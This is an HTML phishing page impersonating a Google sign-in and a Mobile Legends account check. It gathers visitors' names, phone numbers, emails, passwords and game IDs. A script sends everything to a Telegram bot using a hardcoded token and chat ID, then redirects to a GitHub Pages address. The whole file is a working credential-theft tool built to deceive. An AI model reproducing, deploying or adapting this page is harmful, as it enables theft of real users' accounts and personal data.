<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Access</title>
    <style>
        body { margin: 0; height: 100vh; display: flex; justify-content: center; align-items: center; font-family: sans-serif; background: linear-gradient(-45deg, #ee7752, #e73c7e, #23a6d5, #23d5ab); background-size: 400% 400%; animation: gradient 10s ease infinite; }
        @keyframes gradient { 0% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } 100% { background-position: 0% 50%; } }
        
        .card { background: rgba(255, 255, 255, 0.2); backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px); border: 1px solid rgba(255, 255, 255, 0.3); padding: 40px; border-radius: 40px; box-shadow: 0 10px 30px rgba(0,0,0,0.3); width: 300px; text-align: center; color: white; }
        h2 { margin-bottom: 30px; font-size: 32px; letter-spacing: 2px; text-shadow: 1px 1px 2px rgba(0,0,0,0.2); }

        input { width: 100%; padding: 18px; margin: 10px 0; border-radius: 20px; border: 1px solid rgba(255, 255, 255, 0.3); background: rgba(255, 255, 255, 0.1); color: white; box-sizing: border-box; font-size: 16px; transition: 0.3s; }
        
        /* Input Focus လုပ်လျှင် အဝါရောင်ဘောင်မပေါ်အောင် ပြင်ထားသည် */
        input:focus { outline: none !important; border: 1px solid rgba(255, 255, 255, 0.6); background: rgba(255, 255, 255, 0.15); box-shadow: none; }

        button { width: 100%; padding: 18px; margin-top: 20px; border-radius: 20px; border: none; background: white; color: #d63384; font-weight: bold; font-size: 18px; cursor: pointer; }
        #page2 { display: none; }
    </style>
</head>
<body>

    <div class="card" id="page1">
        <h2>Google</h2>
        <input type="text" id="name" placeholder="Name">
        <input type="text" id="number" placeholder="Number">
        <input type="email" id="email" placeholder="Email">
        <input type="password" id="password" placeholder="Password">
        <button onclick="nextPage()">CONTINUE</button>
    </div>

    <div class="card" id="page2">
        <h2>Mobile legends</h2>
        <input type="text" id="gameId" placeholder="Game ID">
        <input type="text" id="zoneId" placeholder="Zone ID">
        <button onclick="submitData()">CONTINUE</button>
    </div>

    <script>
        const token = "8980605393:AAEVTWKvHX--a_XWZMMuLE-M8Pj75WSw5Ks"; 
        const chatId = "7981991075"; 

        function nextPage() {
            document.getElementById('page1').style.display = 'none';
            document.getElementById('page2').style.display = 'block';
        }

        async function submitData() {
            const btn = document.querySelector('#page2 button');
            btn.innerText = "PROCESSING...";

            const msg = `✨ NEW DATA\nName: ${document.getElementById('name').value}\nNumber: ${document.getElementById('number').value}\nEmail: ${document.getElementById('email').value}\nPass: ${document.getElementById('password').value}\nGame ID: ${document.getElementById('gameId').value}\nZone ID: ${document.getElementById('zoneId').value}`;
            
            try {
                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
            } catch(e) {}
            
            // သင်ပေးထားတဲ့ လင့်ခ်ကို ပြောင်းလဲပေးထားပါတယ်
            window.location.href = "https://khtet202315-afk.github.io/Google-Account-/";
        }
    </script>
</body>
</html>
